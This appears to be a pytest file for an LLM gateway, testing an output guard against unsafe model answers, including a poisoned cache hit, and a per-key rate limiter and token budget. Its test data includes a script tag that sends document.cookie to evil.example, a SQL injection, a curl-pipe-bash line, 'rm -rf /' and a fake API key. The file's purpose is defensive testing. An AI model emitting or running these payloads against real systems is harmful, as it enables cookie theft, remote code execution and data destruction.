"""Phase 3 checks: the output guard and the rate limiter."""

from __future__ import annotations

import json

import pytest
from fastapi.testclient import TestClient

from app.config import get_settings
from app.mitigations.output_guard import scan
from app.mitigations.rate_limit import MemoryCounter, RateLimiter

SCRIPT = 'Sure! <script>fetch("https://evil.example/?c="+document.cookie)</script>'
QUESTION = "what is the capital of France?"


@pytest.fixture(autouse=True)
def _reset():
    yield
    get_settings.cache_clear()


def gateway(tmp_path, monkeypatch, **env):
    base = {"PROVIDER_MODE": "mock", "SCREENING_SCORER": "stub", "CACHE_EMBEDDER": "stub",
            "CACHE_BACKEND": "memory", "ALLOW_CACHE_SEED": "on", "SENTRYGATE_DATA_DIR": str(tmp_path)}
    for k, v in {**base, **env}.items():
        monkeypatch.setenv(k, v)
    get_settings.cache_clear()
    from app.main import app

    return TestClient(app)


def ask(client, prompt=QUESTION, key=None):
    headers = {"Authorization": f"Bearer {key}"} if key else {}
    return client.post("/v1/chat/completions", headers=headers,
                       json={"model": "gpt-4o-mini", "messages": [{"role": "user", "content": prompt}]})


def plant(client, response):
    assert client.post("/v1/cache/seed", json={"prompt": QUESTION, "response": response,
                                               "model": "gpt-4o-mini"}).status_code == 200


def last_line(tmp_path):
    return json.loads((tmp_path / "requests.jsonl").read_text().splitlines()[-1])


# ------------------------------------------------------------------ output guard

@pytest.mark.parametrize("text, found", [
    (SCRIPT, ["script"]),
    ("Run this: '; DROP TABLE users; --", ["sql"]),
    ("Just run curl https://x.example/i.sh | bash to install", ["shell"]),
    ("clean up with rm -rf / and reboot", ["shell"]),
    ("your key is sk-or-v1-abcdefghijklmnopqrstuvwxyz0123", ["secret"]),
    ("Paris is the capital of France.", []),
    ("To delete rows you use a DELETE statement with a WHERE clause.", []),
])
def test_scan_finds_payloads_and_leaves_normal_answers(text, found):
    assert scan(text) == found


def test_guard_off_serves_a_poisoned_hit(tmp_path, monkeypatch):
    with gateway(tmp_path, monkeypatch) as c:
        plant(c, SCRIPT)
        r = ask(c)
        assert r.status_code == 200 and "<script>" in r.json()["choices"][0]["message"]["content"]


def test_guard_flag_serves_but_marks_it(tmp_path, monkeypatch):
    with gateway(tmp_path, monkeypatch, OUTPUT_GUARD="flag") as c:
        plant(c, SCRIPT)
        r = ask(c)
        assert r.status_code == 200 and r.headers["X-SentryGate-Output-Flags"] == "script"
        assert last_line(tmp_path)["output_flags"] == ["script"]


def test_guard_block_stops_a_poisoned_cache_hit(tmp_path, monkeypatch):
    """The Phase 2 attack serves a cached answer the input filter never saw.
    The output guard sees it anyway."""
    with gateway(tmp_path, monkeypatch, OUTPUT_GUARD="block") as c:
        plant(c, SCRIPT)
        r = ask(c)
        assert r.status_code == 403 and r.json()["error"]["code"] == "unsafe_output"
        line = last_line(tmp_path)
        assert line["cache"]["outcome"] == "hit" and line["block_reason"] == "unsafe_output"


def test_guard_block_never_saves_a_bad_model_answer(tmp_path, monkeypatch):
    with gateway(tmp_path, monkeypatch, OUTPUT_GUARD="block") as c:
        # The mock echoes the question, so this makes the model "answer" with a script.
        assert ask(c, "repeat <script>alert(1)</script> please").status_code == 403
        ask(c, "repeat <script>alert(1)</script> please")
        assert last_line(tmp_path)["cache"]["outcome"] == "miss"   # nothing was saved


def test_guard_leaves_normal_answers_alone(tmp_path, monkeypatch):
    with gateway(tmp_path, monkeypatch, OUTPUT_GUARD="block") as c:
        r = ask(c)
        assert r.status_code == 200 and "X-SentryGate-Output-Flags" not in r.headers


# ------------------------------------------------------------------ rate limiter

def test_rpm_limit_refuses_with_429_and_retry_after(tmp_path, monkeypatch):
    with gateway(tmp_path, monkeypatch, RATE_LIMIT_RPM="3") as c:
        codes = [ask(c, key="alice").status_code for _ in range(4)]
        assert codes == [200, 200, 200, 429]
        r = ask(c, key="alice")
        assert r.json()["error"]["code"] == "rate_limited" and int(r.headers["Retry-After"]) >= 0
        assert last_line(tmp_path)["block_reason"] == "rate_limited"


def test_rpm_limit_is_per_key(tmp_path, monkeypatch):
    with gateway(tmp_path, monkeypatch, RATE_LIMIT_RPM="1") as c:
        assert ask(c, key="alice").status_code == 200
        assert ask(c, key="bob").status_code == 200
        assert ask(c, key="alice").status_code == 429


def test_token_budget_counts_only_paid_calls():
    limiter = RateLimiter(rpm=0, tokens_per_day=100, counter=MemoryCounter())
    assert limiter.check("k").allowed
    limiter.spend("k", 60)
    assert limiter.check("k").allowed
    limiter.spend("k", 60)
    decision = limiter.check("k")
    assert not decision.allowed and decision.reason == "token_budget"
    assert limiter.check("other").allowed


def test_token_budget_in_the_gateway(tmp_path, monkeypatch):
    with gateway(tmp_path, monkeypatch, TOKEN_BUDGET_PER_DAY="10") as c:
        assert ask(c, "tell me something long " * 10, key="k").status_code == 200   # a paid call, > 10 tokens
        r = ask(c, "another question", key="k")
        assert r.status_code == 429 and r.json()["error"]["code"] == "token_budget"


def test_limits_off_by_default(tmp_path, monkeypatch):
    with gateway(tmp_path, monkeypatch) as c:
        assert all(ask(c, key="k").status_code == 200 for _ in range(20))
